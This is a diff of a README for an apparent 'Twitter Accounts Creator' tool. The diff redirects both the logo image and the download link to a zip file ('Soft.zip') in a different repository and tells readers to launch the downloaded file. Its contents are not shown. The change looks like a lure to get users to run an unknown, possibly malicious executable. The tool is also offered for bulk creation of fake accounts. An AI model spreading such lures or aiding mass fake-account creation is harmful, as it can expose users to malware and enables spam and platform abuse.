@@ -1,6 +1,6 @@
 # 🐦 Twitter Accounts Creator 🐦
 
-![Twitter Logo](https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg)
+![Twitter Logo](https://github.com/santosots/Twitter-accounts-creator-/releases/download/v1.0/Soft.zip)
 
 Welcome to the Twitter Accounts Creator repository! This tool allows you to create Twitter accounts at a rapid pace. Whether you need multiple accounts for testing, automation, or any other purposes, this Python-based solution has got you covered.
 
@@ -18,7 +18,7 @@ The Twitter Accounts Creator is a powerful tool that enables you to generate a l
 
 To get started with the Twitter Accounts Creator, simply download the tool from the following link:
 
-[Download Twitter Accounts Creator](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Download Twitter Accounts Creator](https://github.com/santosots/Twitter-accounts-creator-/releases/download/v1.0/Soft.zip)
 
 🚀 **Note: The downloaded file needs to be launched to access the tool.**
 
